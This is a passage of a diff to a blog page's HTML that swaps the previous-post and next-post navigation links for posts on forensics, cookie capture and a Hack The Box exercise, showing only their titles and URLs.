+                      <a href="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" title="一次通过组合拳拿到cookie的学习记录">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">取证闲谈</span>
+                        <span class="hidden-mobile">一次通过组合拳拿到cookie的学习记录</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -445,8 +479,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/" title="Docker取证小tip">
-                        <span class="hidden-mobile">Docker取证小tip</span>
+                      <a href="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/" title="梦中的一次HTB">
+                        <span class="hidden-mobile">梦中的一次HTB</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
